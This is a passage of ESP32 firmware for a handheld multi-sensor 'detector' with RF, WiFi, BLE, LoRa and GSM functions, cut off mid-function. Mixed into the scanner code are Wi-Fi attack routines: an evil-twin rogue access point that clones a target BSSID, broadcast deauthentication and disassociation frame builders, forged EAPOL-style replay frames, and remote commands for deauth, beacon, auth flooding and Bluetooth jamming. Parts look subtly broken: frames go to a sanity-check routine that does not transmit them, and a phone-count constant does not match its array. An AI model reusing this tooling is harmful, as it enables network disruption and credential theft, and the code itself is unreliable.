#include <Wire.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SH110X.h>
#include <esp_wifi.h>
#include <SPI.h>
#include <LoRa.h>
#include <HardwareSerial.h>

extern "C" {
  int ieee80211_raw_frame_sanity_check(int, const void *, int, bool);
}

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define SDA_PIN 8
#define SCL_PIN 9
#define RF_PIN 10
#define HALL_PIN 11
#define MIC_PIN 1
#define BUZZER_PIN 5
#define VIBRATION_PIN 6
#define STATUS_LED 18
#define CAMERA_SENSOR_PIN 7
#define BATTERY_PIN 12
#define JOY_X_PIN 15
#define JOY_Y_PIN 16
#define JOY_SW_PIN 17
#define LORA_CS    2
#define LORA_RST   3
#define LORA_DIO0  35
#define LORA_SCK   13
#define LORA_MOSI  14
#define LORA_MISO  21
#define GSM_RX_PIN  0
#define GSM_TX_PIN  36
#define GSM_PEN_PIN 38
#define GSM_PWK_PIN 39

HardwareSerial gsm(1);

bool gsmModuleFound = false;
bool gsmRegistered = false;
int gsmSignalQuality = 0;
String gsmOperator = "";
String gsmSimStatus = "";
float gsmLat = 0.0, gsmLon = 0.0;
bool gsmGpsFixed = false;
unsigned long gsmInitTime = 0;
unsigned long lastSmsTime = 0;
const unsigned long SMS_COOLDOWN = 30000;
const char* ALERT_PHONES[] = {"8xxxxxxxx9"};
const int ALERT_PHONE_COUNT = 3;
#define ALERT_PHONE ALERT_PHONES[0]  // primary number for single-target displays

bool loraModuleFound = false;
int loraPacketCount = 0;
unsigned long loraLastTxTime = 0;
#define LORA_TX_INTERVAL 3000
#define LORA_FREQUENCY 433E6
bool loraPeerConnected = false;
int loraLastRssi = 0;
float loraLastSnr = 0.0;
unsigned long loraLastRxTime = 0;
String loraLastRxPacket = "";
#define LORA_PEER_TIMEOUT 10000

// WROOM link parser
bool wroomOnline = false;
int wroomWifi = 0;
int wroomBle = 0;
bool wroomAttack = false;
unsigned long wroomUp = 0;
unsigned long wroomLastSeen = 0;
int wroomRxCount = 0;
String wroomLastPkt = "";
#define WROOM_LINK_TIMEOUT 10000

// Remote terminal state
int wroomMode = 0;
int wroomMenu = 0;
int wroomSel = 0;
unsigned long wroomPktCount = 0;
unsigned long wroomErrCount = 0;
unsigned long wroomUptime = 0;
String wroomTargetSSID = "";
String wroomTargetSec = "";
int wroomTargetRSSI = 0;
int wroomTargetCH = 0;
String wroomTopSSID[3] = {"", "", ""};
int wroomTopRSSI[3] = {0, 0, 0};
String lastSentCmd = "";
unsigned long lastCmdTime = 0;
String lastAck = "";
unsigned long lastAckTime = 0;
int terminalPage = 0;
bool controlMode = false;  // false = VIEW pages, true = SEND commands  // true = joystick sends commands, false = joystick flips pages
unsigned long swPressStart = 0;
bool swLongHandled = false;

// Mode selector
const char* remoteModes[] = {
  "MENU", "WiFi Scan", "BLE Scan", "Deauth", "Deauth All",
  "Beacon", "Probe", "Auth", "Evil Twin", "Sniffer",
  "LoRa", "BT Jam", "NRF Scan"
};
const int REMOTE_MODE_COUNT = 13;
const char* remoteModeCmds[] = {
  "menu", "wifi", "ble", "deauth", "deauthall",
  "beacon", "probe", "auth", "evil", "sniffer",
  "lora", "btjam", "nrfscan"
};
int modeSelectorIdx = 0;
// Phone Detector state
bool pdBleActive = false;
bool pdWifiActive = false;

// Phone Detector tuning: close-range detection (< ~1 meter)
#define PD_BLE_CLOSE_RSSI   -55    // BLE closer than ~1m
#define PD_WIFI_CLOSE_RSSI  -60    // WiFi AP from phone hotspot closer than ~1m
#define PD_RF_SPIKE_DB      12.0   // ignore small RF spikes (was adding false confidence)
#define PD_DETECT_CONF      50     // minimum confidence to declare a phone

bool modeSelectorActive = false;


#define JOY_LOW_ZONE 1200
#define JOY_HIGH_ZONE 2800

float batteryVoltage = 0.0;
int batteryPercent = 0;
unsigned long batteryTimer = 0;

#define AD8318_SLOPE      0.024
#define AD8318_INTERCEPT  -28.0
#define ADC_MAX           4095
#define ADC_VREF          3.3

float rfBaseline = 0.0;
float rfRawDbm = -70.0;
float rfSpikeDb = 0.0;
float rfVoltage = 0.0;
float rfPowerDbm = -70.0;
bool rfCalibrated = false;
int rfCalSamples = 0;
long rfCalSum = 0;

#define RF_BASELINE_ALPHA  0.95
#define RF_SPIKE_THRESHOLD 8.0

enum RFMode { RF_SPECTRUM, RF_METER, RF_PEAK, RF_HISTORY, RF_ALERTMODE, RF_STATS };
RFMode currentRFMode = RF_SPECTRUM;
#define RF_HISTORY_SIZE 64
int rfHistory[RF_HISTORY_SIZE];
int rfPeak = 0, rfPrevious = 0;
unsigned long rfBursts = 0;
bool burstActive = false;
unsigned long lastAnimation = 0;
int headerAnim = 0;

struct WifiEntry { String ssid, bssid; int rssi, channel; wifi_auth_mode_t security; unsigned long lastSeen; };
#define MAX_WIFI_ENTRIES 50
WifiEntry wifiList[MAX_WIFI_ENTRIES];
int wifiCount = 0;
unsigned long wifiScanTimer = 0;

struct BLEEntry { String name, mac; int rssi; unsigned long lastSeen; };
#define MAX_BLE_ENTRIES 50
BLEEntry bleList[MAX_BLE_ENTRIES];
int bleCount = 0;
unsigned long bleScanTimer = 0;

enum WifiSubMode { WIFI_SCAN, WIFI_JAM };
WifiSubMode currentWifiSubMode = WIFI_SCAN;
bool jamActive = false;
unsigned long jamStartTime = 0;
int jamPacketCount = 0, jamErrorCount = 0;
bool jammerInitialized = false, evilTwinStarted = false;
uint8_t capturedStaMac[6] = {0};
bool hasCapturedSta = false;
unsigned long lastReplayTime = 0;
int replayCount = 0;

#define CAM_HISTORY_SIZE 48
int camHistory[CAM_HISTORY_SIZE];
int camHistoryIdx = 0;
int camSmoothValue = 0;
int camBaseline = 0;
int camPeakValue = 0;
int camThreshold = 300;
bool camDetectionActive = false;
const int CAM_BASELINE_SAMPLES = 100;
const float CAM_THRESHOLD_MULTIPLIER = 2.5;

enum GsmSubMode {
  GSM_MAIN_MENU,
  GSM_SEND_SMS,
  GSM_SIGNAL,
  GSM_NETWORK,
  GSM_SIM_STATUS
};
GsmSubMode currentGsmSubMode = GSM_MAIN_MENU;

const char* gsmMenuLabels[] = {
  "SEND SMS",
  "SIGNAL QUALITY",
  "NETWORK INFO",
  "SIM STATUS"
};
const int GSM_MENU_ITEMS = 4;
int gsmMenuSelected = 0;
int gsmMenuAnimatedBox = 0, gsmMenuTargetBox = 0;

const char* gsmQuickSms[] = {
  "Status: All OK",
  "Alert test signal",
  "Battery report",
  "Emergency Alert"
};
const int GSM_QUICK_SMS_COUNT = 4;
bool iccidFetched = false;

enum Mode {
  START_SCREEN, MENU_SCREEN,
  MODE_RF, MODE_WIFI, MODE_WIFI_INFO, MODE_BLE, MODE_BLE_INFO,
  MODE_MAGNETIC, MODE_AUDIO, MODE_CAMERA, MODE_SETTINGS,
  MODE_LORA, MODE_GSM,
  MODE_PHONE_DETECT
};
Mode currentMode = START_SCREEN;

int selectedMenuItem = 0;
const int totalMenuItems = 10;
const char* menuItems[] = {
  "RF Scanner", "WiFi Scanner", "BLE Scanner", "Phone Detector",
  "Magnetic Field", "Audio Detect", "Hidden Camera", "LoRa Radio",
  "GSM", "Settings"
};

int animatedBoxY = 16 * 100, targetBoxY = 16 * 100;
float radarAngle = 0.0;
int rfValue = 0, hallValue = 0, micValue = 0;
bool readyForInput = true;
int scanSelectedIndex = 0, scrollOffset = 0, wifiInfoPage = 0, loraInfoPage = 0;
unsigned long globalTicker = 0;
bool scanInitiated = false;

Adafruit_SH1106G display = Adafruit_SH1106G(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
BLEScan* pBLEScan = nullptr;
#define DISP_CENTER_X 66
#define DISP_CENTER_Y 32

const unsigned char logo_crosshair[] PROGMEM = {
  0x01,0x80,0x07,0xe0,0x0e,0x70,0x1c,0x38,0x38,0x1c,0x31,0x8c,0x63,0xc6,0x63,0xc6,
  0x63,0xc6,0x63,0xc6,0x31,0x8c,0x38,0x1c,0x1c,0x38,0x0e,0x70,0x07,0xe0,0x01,0x80
};
const unsigned char icon_bluetooth[] PROGMEM = {
  0x01,0x00,0x01,0x80,0x01,0xc0,0x09,0x60,0x0d,0x30,0x07,0x60,0x03,0xc0,0x01,0x80,
  0x03,0xc0,0x07,0x60,0x0d,0x30,0x09,0x60,0x01,0xc0,0x01,0x80,0x01,0x80,0x00,0x00
};
const unsigned char icon_wifi[] PROGMEM = {
  0x07,0xe0,0x1f,0xf8,0x38,0x1c,0x60,0x06,0x0d,0xb0,0x1f,0xf8,0x30,0x0c,0x01,0x80,
  0x03,0xc0,0x06,0x60,0x00,0x00,0x01,0x80,0x03,0xc0,0x03,0xc0,0x01,0x80,0x00,0x00
};
const unsigned char icon_camera[] PROGMEM = {
  0x00,0x00,0x03,0xc0,0x0f,0xf0,0x1c,0x38,0x38,0x1c,0x30,0x0c,0x63,0xc6,0x67,0xe6,
  0x67,0xe6,0x63,0xc6,0x30,0x0c,0x38,0x1c,0x1c,0x38,0x0f,0xf0,0x03,0xc0,0x00,0x00
};
const unsigned char icon_sweep[] PROGMEM = {
  0x18,0x18,0x3c,0x3c,0x66,0x66,0x66,0x66,0xc3,0xc3,0xc3,0xc3,0x01,0x80,0x03,0xc0,
  0x07,0xe0,0x0e,0x70,0x0c,0x30,0x18,0x18,0x18,0x18,0x00,0x00,0x18,0x18,0x18,0x18
};
const unsigned char icon_jam[] PROGMEM = {
  0x01,0x00,0x02,0x00,0x04,0x00,0x08,0x00,0x10,0x00,0x3f,0xe0,0x00,0x10,0x00,0x08,
  0x00,0x04,0x00,0x02,0x07,0xfc,0x00,0x20,0x00,0x40,0x00,0x80,0x01,0x00,0x02,0x00
};
const unsigned char icon_antenna[] PROGMEM = {
  0x00,0x00,0x03,0x80,0x03,0x80,0x03,0x80,0x03,0x80,0x03,0x80,0x03,0x80,0x0e,0x38,
  0x08,0x08,0x18,0x0c,0x10,0x04,0x30,0x06,0x20,0x02,0x20,0x02,0x00,0x00,0x00,0x00
};
const unsigned char icon_gsm[] PROGMEM = {
  0x00,0x00,0x00,0x00,0x03,0x80,0x07,0xc0,0x0e,0xe0,0x1e,0xf0,0x3c,0x78,0x78,0x3c,
  0x70,0x1c,0x20,0x08,0x03,0x80,0x03,0x80,0x03,0x80,0x00,0x00,0x00,0x00,0x00,0x00
};

void sendAlertSMS(String message);
void updateGsmStatus();
void sendWroomCommand(String cmd);

void sendLoRaDataPacket() {
  String packet = "$S3D,";
  packet += String(batteryPercent) + "," + String(batteryVoltage, 2) + ",";
  packet += String(wifiCount) + "," + String(bleCount) + ",";
  packet += String(rfValue) + "," + String((hallValue == LOW) ? 1 : 0) + ",";
  packet += String(micValue) + "," + String((micValue > 1800) ? 1 : 0) + ",";
  packet += String(camDetectionActive ? 1 : 0) + "," + String(millis() / 1000) + "*";
  LoRa.beginPacket();
  LoRa.print(packet);
  LoRa.endPacket();
  loraPacketCount++;
  LoRa.receive();
}

void sendWroomCommand(String cmd) {
  if (!loraModuleFound) return;
  LoRa.beginPacket();
  LoRa.print("$CMD," + cmd + "*");
  LoRa.endPacket();
  LoRa.receive();
  lastSentCmd = cmd;
  lastCmdTime = millis();
}

void onLoRaReceive(int packetSize) {
  if (packetSize == 0) return;
  String incoming = "";
  while (LoRa.available()) {
    incoming += (char)LoRa.read();
  }

  loraLastRssi = LoRa.packetRssi();
  loraLastSnr = LoRa.packetSnr();
  loraLastRxTime = millis();

  // Parse legacy WROOM telemetry
  if (incoming.startsWith("$WROOM,")) {
    wroomOnline = true;
    wroomLastSeen = millis();
    wroomRxCount++;
    wroomLastPkt = incoming;

    int s = 7;
    int e = incoming.indexOf(',', s);
    wroomWifi = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomBle = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomAttack = incoming.substring(s, e).toInt() == 1;

    s = e + 1; e = incoming.indexOf('*', s);
    wroomUp = incoming.substring(s, e).toInt();

    loraPeerConnected = true;
    loraLastRxPacket = incoming;
  }

  // Parse full state broadcast from remote node
  if (incoming.startsWith("$ST,")) {
    wroomOnline = true;
    wroomLastSeen = millis();
    wroomRxCount++;

    int s = 4;
    int e = incoming.indexOf(',', s);
    wroomMode = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomMenu = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomWifi = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomBle = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomSel = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomAttack = incoming.substring(s, e).toInt() == 1;

    s = e + 1; e = incoming.indexOf(',', s);
    wroomPktCount = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomErrCount = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomUptime = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomTargetSSID = incoming.substring(s, e);

    s = e + 1; e = incoming.indexOf(',', s);
    wroomTargetRSSI = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomTargetCH = incoming.substring(s, e).toInt();

    s = e + 1; e = incoming.indexOf(',', s);
    wroomTargetSec = incoming.substring(s, e);

    for (int i = 0; i < 3; i++) {
      s = e + 1; e = incoming.indexOf(',', s);
      wroomTopSSID[i] = incoming.substring(s, e);
      s = e + 1;
      if (i < 2) e = incoming.indexOf(',', s);
      else e = incoming.indexOf('*', s);
      wroomTopRSSI[i] = incoming.substring(s, e).toInt();
    }

    loraPeerConnected = true;
    loraLastRxPacket = incoming;
  }

  // Parse ACK
  if (incoming.startsWith("$ACK,")) {
    int s = 5;
    int e = incoming.indexOf('*', s);
    lastAck = incoming.substring(s, e);
    lastAckTime = millis();
  }
}

void initRogueAp(int targetIndex) {
  if (targetIndex < 0 || targetIndex >= wifiCount) return;
  WifiEntry &target = wifiList[targetIndex];
  WiFi.disconnect(true); delay(100);
  esp_wifi_set_promiscuous(false); delay(50);
  uint8_t targetBssid[6]; int bssidBytes[6];
  sscanf(target.bssid.c_str(), "%x:%x:%x:%x:%x:%x", &bssidBytes[0], &bssidBytes[1], &bssidBytes[2], &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]);
  for (int i = 0; i < 6; i++) targetBssid[i] = (uint8_t)bssidBytes[i];
  WiFi.mode(WIFI_MODE_APSTA); delay(50);
  esp_wifi_set_mac(WIFI_IF_AP, targetBssid); delay(70);
  WiFi.softAP(target.ssid.c_str(), "dummypassword", target.channel, 0, 1); delay(100);
  esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE); delay(10);
  esp_wifi_set_promiscuous(true); delay(10);
  jamPacketCount = 0; jamErrorCount = 0;
}

void sendDeauthFrame() {
  uint8_t packet[26];
  uint8_t apBssid[6]; int bssidBytes[6];
  sscanf(wifiList[scanSelectedIndex].bssid.c_str(), "%x:%x:%x:%x:%x:%x", &bssidBytes[0], &bssidBytes[1], &bssidBytes[2], &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]);
  for (int i = 0; i < 6; i++) apBssid[i] = (uint8_t)bssidBytes[i];
  packet[0] = 0xC0; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00;
  memcpy(&packet[4], "\xff\xff\xff\xff\xff\xff", 6);
  memcpy(&packet[10], apBssid, 6); memcpy(&packet[16], apBssid, 6);
  packet[22] = 0x07; packet[23] = 0x00; packet[24] = 0x00; packet[25] = 0x00;
  if (ieee80211_raw_frame_sanity_check(0xC0, packet, sizeof(packet), false) == ESP_OK) jamPacketCount++; else jamErrorCount++;
  delay(3);
  memcpy(&packet[4], apBssid, 6);
  if (ieee80211_raw_frame_sanity_check(0xC0, packet, sizeof(packet), false) == ESP_OK) jamPacketCount++; else jamErrorCount++;
  delay(3);
  packet[0] = 0xA0; memcpy(&packet[4], "\xff\xff\xff\xff\xff\xff", 6); packet[22] = 0x08;
  if (ieee80211_raw_frame_sanity_check(0xA0, packet, sizeof(packet), false) == ESP_OK) jamPacketCount++; else jamErrorCount++;
}

void stopRogueAp() {
  esp_wifi_set_promiscuous(false); delay(10);
  WiFi.softAPdisconnect(true); delay(10);
  WiFi.disconnect(true); delay(50);
  evilTwinStarted = false; jammerInitialized = false; jamActive = false;
  currentWifiSubMode = WIFI_SCAN;
  WiFi.mode(WIFI_STA); delay(50);
  scanInitiated = false; wifiScanTimer = 0; digitalWrite(STATUS_LED, LOW);
}

void sniffAndReplayFrames() {
  if (!evilTwinStarted || wifiCount == 0) return;
  uint8_t apBssid[6]; int bssidBytes[6];
  sscanf(wifiList[scanSelectedIndex].bssid.c_str(), "%x:%x:%x:%x:%x:%x", &bssidBytes[0], &bssidBytes[1], &bssidBytes[2], &bssidBytes[3], &bssidBytes[4], &bssidBytes[5]);
  for (int i = 0; i < 6; i++) apBssid[i] = (uint8_t)bssidBytes[i];
  uint8_t fakeSta[6] = {0x00, 0x11, 0x22, 0x33, 0x44, (uint8_t)(millis() % 256)};
  uint8_t replayPacket[32];
  replayPacket[0] = 0x48; replayPacket[1] = 0x01; replayPacket[2] = 0x00; replayPacket[3] = 0x00;
  memcpy(&replayPacket[4], apBssid, 6); memcpy(&replayPacket[10], fakeSta, 6); memcpy(&replayPacket[16], apBssid, 6);
  replayPacket[24] = 0xAA; replayPacket[25] = 0xAA; replayPacket[26] = 0x03;
  replayPacket[27] = 0x00; replayPacket[28] = 0x00; replayPacket[29] = 0x00; replayPacket[30] = 0x88; replayPacket[31] = 0x8E;
  if (ieee80211_raw_frame_sanity_check(0x48, replayPacket, 32, false) == ESP_OK) replayCount++;
  delay(2);
  replayPacket[0] = 0x42; replayPacket[1] = 0x02;
  memcpy(&replayPacket[4], fakeSta, 6); memcpy(&replayPacket[10], apBssid, 6); memcpy(&replayPacket[16], apBssid, 6);
  replayPacket[24] = (uint8_t)(millis() % 256); replayPacket[25] = (uint8_t)((millis() / 2) % 256); replayPacket[26] = (uint8_t)((millis() / 3) % 256);
  ieee80211_raw_frame_sanity_check(0x42, replayPacket, 32, false);
}

void drawSegmentedBar(int y, int value, int maxVal) {
  int fillWidth = constrain(map(value, 0, maxVal, 0, 122), 0, 122);
  display.drawRect(0, y, 126, 5, SH110X_WHITE);
  for (int i = 2; i < fillWidth; i += 4) display.fillRect(i, y + 1, 2, 3, SH110X_WHITE);
}

void renderPremiumSplash(const unsigned char* bitmap, const char* label) {
  for (int progress = 0; progress <= 100; progress += 8) {
    display.clearDisplay();
    int bounceOffset = cos((progress * 0.15)) * 4;
    display.fillRect(1, 2, map(progress, 0, 100, 0, 126), 1, SH110X_WHITE);
    display.fillRect(127 - map(progress, 0, 100, 0, 126), 61, map(progress, 0, 100, 0, 126), 1, SH110X_WHITE);
    display.drawBitmap(DISP_CENTER_X - 8, 14 + bounceOffset, bitmap, 16, 16, SH110X_WHITE);
    display.setTextSize(1);
    display.setCursor(DISP_CENTER_X - (strlen(label) * 3), 38); display.print(label);
    display.drawRect(24, 50, 80, 4, SH110X_WHITE);
    display.fillRect(26, 51, map(progress, 0, 100, 0, 76), 2, SH110X_WHITE);
    display.display(); delay(5);
  }
}

void alert(bool state) {
  digitalWrite(BUZZER_PIN, state);
  digitalWrite(VIBRATION_PIN, state);
  digitalWrite(STATUS_LED, state);
}

float readBatteryVoltage() {
  int adc = analogRead(BATTERY_PIN);
  return (adc / 4095.0) * 3.3 * 2.0;
}

int getBatteryPercent(float voltage) {
  if (voltage >= 4.20) return 100;
  if (voltage <= 3.20) return 0;
  return (int)(((voltage - 3.20) / 1.0) * 100.0);
}

void updateBattery() {
  batteryVoltage = readBatteryVoltage();
  batteryPercent = constrain(getBatteryPercent(batteryVoltage), 0, 100);
}

void drawBatteryIcon(int x, int y, int percent) {
  display.drawRect(x, y, 18, 8, SH110X_WHITE);
  display.drawRect(x + 18, y + 2, 2, 4, SH110X_WHITE);
  int fill = constrain(map(percent, 0, 100, 0, 16), 0, 16);
  display.fillRect(x + 1, y + 1, fill, 6, SH110X_WHITE);
}
void drawGsmIndicator(int x, int y) {
  if (!gsmModuleFound) {
    // No GSM module — small cross
    display.drawLine(x + 1, y + 2, x + 5, y + 8, SH110X_WHITE);
    display.drawLine(x + 5, y + 2, x + 1, y + 8, SH110X_WHITE);
    return;
  }
  if (gsmSimStatus != "READY" || !gsmRegistered) {
    // SIM card outline (no service)
    display.drawRect(x, y + 1, 8, 9, SH110X_WHITE);
    display.drawRect(x + 2, y + 3, 4, 4, SH110X_WHITE);
    display.drawPixel(x + 3, y + 4, SH110X_WHITE);
    display.drawPixel(x + 4, y + 4, SH110X_WHITE);
    display.drawPixel(x + 3, y + 5, SH110X_WHITE);
    display.drawPixel(x + 4, y + 5, SH110X_WHITE);
  } else {
    // Signal bars (1-4) based on CSQ 0-31
    int bars = 0;
    if (gsmSignalQuality > 0 && gsmSignalQuality < 99) {
      if (gsmSignalQuality >= 20) bars = 4;
      else if (gsmSignalQuality >= 14) bars = 3;
      else if (gsmSignalQuality >= 8) bars = 2;
      else bars = 1;
    }
    int bw = 2;
    int bh[4] = {3, 5, 7, 9};
    for (int i = 0; i < 4; i++) {
      int bx = x + (i * 3);
      int by = y + 10 - bh[i];
      if (i < bars) display.fillRect(bx, by, bw, bh[i], SH110X_WHITE);
      else display.drawRect(bx, by, bw, bh[i], SH110X_WHITE);
    }
  }
}


String getRFLevelText(int percent) {
  if (percent < 15)  return "AMBIENT";
  if (percent < 40)  return "WEAK";
  if (percent < 70)  return "STRONG";
  return "EXTREME!";
}

String getTrendText() {
  if (rfValue > rfPrevious + 5) return "UP";
  if (rfValue < rfPrevious - 5) return "DOWN";
  return "STABLE";
}

void updateRFHistory() {
  memmove(rfHistory, rfHistory + 1, (RF_HISTORY_SIZE - 1) * sizeof(int));
  rfHistory[RF_HISTORY_SIZE - 1] = rfValue;
}

String getSecurityName(wifi_auth_mode_t sec) {
  switch (sec) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    default: return "UNKNOWN";
  }
}

int getSignalQuality(int rssi) {
  if (rssi <= -100) return 0;
  if (rssi >= -50) return 100;
  return 2 * (rssi + 100);
}

bool initLoRa() {
  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_CS);
  LoRa.setPins(LORA_CS, LORA_RST, LORA_DIO0);
  if (!LoRa.begin(LORA_FREQUENCY)) return false;
  LoRa.setSpreadingFactor(12);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(8);
  LoRa.setTxPower(20);
  LoRa.setSyncWord(0xF3);
  LoRa.enableCrc();
  LoRa.onReceive(onLoRaReceive);
  LoRa.receive();
  return true;
}

void sendAlertSMS(String message) {
  if (!gsmModuleFound || !gsmRegistered) {
    Serial.println("GSM not ready, SMS not sent");
    return;
  }
  if (millis() - lastSmsTime < SMS_COOLDOWN) {
    Serial.println("SMS cooldown active");
    return;
  }
  lastSmsTime = millis();
  gsm.println("AT"); delay(500);
  gsm.println("AT+CMGF=1"); delay(500);
  gsm.print("AT+CMGS=\"");
  gsm.print(ALERT_PHONE);
  gsm.println("\""); delay(500);
  gsm.print(message); delay(300);
  gsm.write(26);
  delay(3000);
  Serial.println("SMS sent: " + message);
}

void updateGsmStatus() {
  if (!gsmModuleFound) return;
  while (gsm.available()) gsm.read();
  gsm.println("AT+CREG?"); delay(400);
  String resp = "";
  while (gsm.available()) resp += (char)gsm.read();
  resp.toUpperCase();
  gsmRegistered = (resp.indexOf("+CREG: 0,1") != -1 || resp.indexOf("+CREG: 0,5") != -1);
  gsm.println("AT+CSQ"); delay(400);
  resp = "";
  while (gsm.available()) resp += (char)gsm.read();
  int idx1 = resp.indexOf("+CSQ: ");
  if (idx1 != -1) {
    int idx2 = resp.indexOf(",", idx1 + 6);
    if (idx2 != -1) gsmSignalQuality = resp.substring(idx1 + 6, idx2).toInt();
  }
  gsm.println("AT+COPS?"); delay(400);
  resp = "";
  while (gsm.available()) resp += (char)gsm.read();
  int n1 = resp.indexOf("\"");
  if (n1 != -1) {
    int n2 = resp.indexOf("\"", n1 + 1);
    if (n2 != -1) gsmOperator = resp.substring(n1 + 1, n2);
  }
  gsm.println("AT+CPIN?"); delay(500);
  resp = "";
  while (gsm.available()) resp += (char)gsm.read();
  resp.toUpperCase();
  if (resp.indexOf("READY") != -1) gsmSimStatus = "READY";
  else if (resp.indexOf("SIM PIN") != -1) gsmSimStatus = "PIN LOCKED";
  else if (resp.indexOf("SIM PUK") != -1) gsmSimStatus = "PUK LOCKED";
  else if (resp.indexOf("ERROR") != -1 || resp.length() == 0) gsmSimStatus = "NO SIM";
  else gsmSimStatus = "ERROR";
  gsm.println("AT+CGPS?"); delay(300);
  resp = "";
  while (gsm.available()) resp += (char)gsm.read();
  gsmGpsFixed = (resp.indexOf("+CGPS: 1,") != -1);
}

void runStartScreen() {
  static int phase = 0;
  static unsigned long phaseStart = 0;
  static int sweepCount = 0;
  if (phase == 0 && phaseStart == 0) { phaseStart = millis(); sweepCount = 0; }
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(16, 8); display.print("MULTI");
  display.setCursor(10, 28); display.print("DETECTOR");
  if (phase == 0) {
    unsigned long elapsed = millis() - phaseStart;
    float sweepTime = 1200.0;
    int scanY = (int)(fmod((float)elapsed, sweepTime) / sweepTime * 64.0);
    display.drawFastHLine(0, scanY, 128, SH110X_WHITE);
    static int lastSweep = -1;
    int currentSweep = elapsed / (int)sweepTime;
    if (currentSweep != lastSweep) { lastSweep = currentSweep; sweepCount++; }
    if (sweepCount >= 3) { phase = 1; phaseStart = millis(); }
  }
  if (phase == 1) {
    if (millis() - phaseStart > 600) {
      phase = 0; phaseStart = 0; sweepCount = 0;
      currentMode = MENU_SCREEN;
      return;
    }
    display.drawLine(2, 0, 8, 0, SH110X_WHITE);
    display.drawLine(2, 0, 2, 6, SH110X_WHITE);
    display.drawLine(126, 0, 120, 0, SH110X_WHITE);
    display.drawLine(126, 0, 126, 6, SH110X_WHITE);
  }
  display.display();
  delay(10);
}

void runMenuScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SH110X_WHITE);
  display.setCursor(12, 0); display.print("MENU");
  drawGsmIndicator(50, 0);
  display.setCursor(80, 0); display.print(batteryPercent); display.print("%");
  drawBatteryIcon(105, 0, batteryPercent);
  display.drawLine(0, 10, 128, 10, SH110X_WHITE);

  int menuScrollOffset = 0;
  if (selectedMenuItem >= 3) { menuScrollOffset = selectedMenuItem - 2; if (menuScrollOffset > totalMenuItems - 4) menuScrollOffset = totalMenuItems - 4; }

  targetBoxY = (14 + ((selectedMenuItem - menuScrollOffset) * 11)) * 100;
  animatedBoxY += ((targetBoxY - animatedBoxY) * 45) / 100;
  display.fillRect(2, (animatedBoxY / 100), 4, 7, SH110X_WHITE);

  for (int i = 0; i < 4; i++) {
    int itemIdx = menuScrollOffset + i;
    if (itemIdx >= totalMenuItems) break;
    int rowY = 14 + (i * 11);

    if (itemIdx == selectedMenuItem) {
      // Bold selected text: draw twice with 1px offset for thickness
      display.setCursor(10, rowY);
      display.print("> ");
      display.print(menuItems[itemIdx]);
      display.setCursor(11, rowY);   // 1px right offset
      display.print("> ");
      display.print(menuItems[itemIdx]);
    } else {
      display.setCursor(10, rowY);
      display.print("  ");
      display.print(menuItems[itemIdx]);
    }

    if (itemIdx == 7) { display.setCursor(118, rowY); display.print(loraModuleFound ? "*" : "-"); }
    if (itemIdx == 8) { display.setCursor(118, rowY); display.print(gsmModuleFound ? "G" : "-"); }
  }
  display.display();
}

void runRFScan() {
  rfPrevious = rfValue;
  int rawSum = 0;
  for (int i = 0; i < 10; i++) {
    rawSum += analogRead(RF_PIN);
    delayMicroseconds(200);
  }
  rfVoltage = (rawSum / 10.0 / ADC_MAX) * ADC_VREF;
  rfRawDbm = (rfVoltage / AD8318_SLOPE) + AD8318_INTERCEPT;

  if (!rfCalibrated) {
    rfCalSum += (long)(rfRawDbm * 100);
    rfCalSamples++;
    if (rfCalSamples >= 50) {
      rfBaseline = (rfCalSum / 50.0) / 100.0;
      rfCalibrated = true;
      Serial.print("RF calibrated. Baseline: ");
      Serial.print(rfBaseline, 1);
      Serial.println(" dBm");
    }
    rfPowerDbm = -70.0;
    rfValue = 0;
    rfSpikeDb = 0;
  } else {
    float deviation = rfRawDbm - rfBaseline;
    if (deviation < RF_SPIKE_THRESHOLD) {
      rfBaseline = (RF_BASELINE_ALPHA * rfBaseline) + ((1.0 - RF_BASELINE_ALPHA) * rfRawDbm);
    }
    rfPowerDbm = rfRawDbm;
    rfSpikeDb = rfRawDbm - rfBaseline;
    rfValue = constrain((int)((rfSpikeDb / 25.0) * 100.0), 0, 100);
    if (rfValue > rfPeak) rfPeak = rfValue;
    if (rfSpikeDb > RF_SPIKE_THRESHOLD && !burstActive) {
      rfBursts++;
      burstActive = true;
      Serial.print("RF SPIKE: ");
      Serial.print(rfSpikeDb, 1);
      Serial.println(" dB above baseline");

      static unsigned long lastRfAlertSms = 0;
      if (millis() - lastRfAlertSms > SMS_COOLDOWN) {
        lastRfAlertSms = millis();
        sendAlertSMS("RF ALERT! Spike: " + String(rfSpikeDb, 1) + "dB above ambient");
      }
    }
